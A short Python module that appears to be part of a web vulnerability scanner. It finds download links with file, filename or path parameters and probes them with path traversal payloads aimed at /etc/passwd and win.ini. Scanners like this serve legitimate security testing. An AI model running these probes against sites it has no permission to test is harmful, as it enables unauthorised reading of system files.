from urllib.parse import urlparse
from bs4 import BeautifulSoup as bs
import requests


def file_download(s, url):
    split_url = url.split('/')
    ori_url = f"{split_url[0]}//{split_url[2]}"
    req = s.get(url)
    links = bs(req.text,'html.parser').find_all('a')

    result=[]

    down_url = ""
    down_str = ""
    check_str = ['file=','filename=', 'path=']
    for link in links:
        for str in check_str:
            if str in link['href']:
                down_url = link['href']
                down_str = str[:-1]
                break
        if down_url : break
    if not down_url : return result

    if down_url[0] == "/": full_url = ori_url+down_url
    else : full_url = down_url
    full_url = urlparse(full_url)

    data={}
    # 기존에 다른 파라미터들은 그대로 유지하기 위한 코드
    split_param = full_url.query.split("&")
    for param in split_param:
        temp = param.split("=")
        data[temp[0]] = temp[1]
    
    check_vuln = [
        # Linux
        '/etc/passwd',
        '/../../../../../../../../../../etc/passwd', 
        '//../..//../..//../..//../..//../..//etc/passwd',
        '%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd',
        # WINDOW 
        '/winnt/win.ini', 
        '../../../../../../../../../../winnt/win.ini', 
        '//../..//../..//../..//../..//../..//winnt/win.ini', 
        '%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fwinnt%2Fwin.ini',
        # '../../../../../../../../../../boot.ini'
    ]

    check_url = f'{full_url.scheme}://{full_url.netloc}{full_url.path}'
    for vuln in check_vuln:
        data[down_str] = vuln
        req = s.get(check_url, params=data)
        
        if "Content-Disposition" in req.headers :
            result.append(f"{req.url}") 
            
    return result
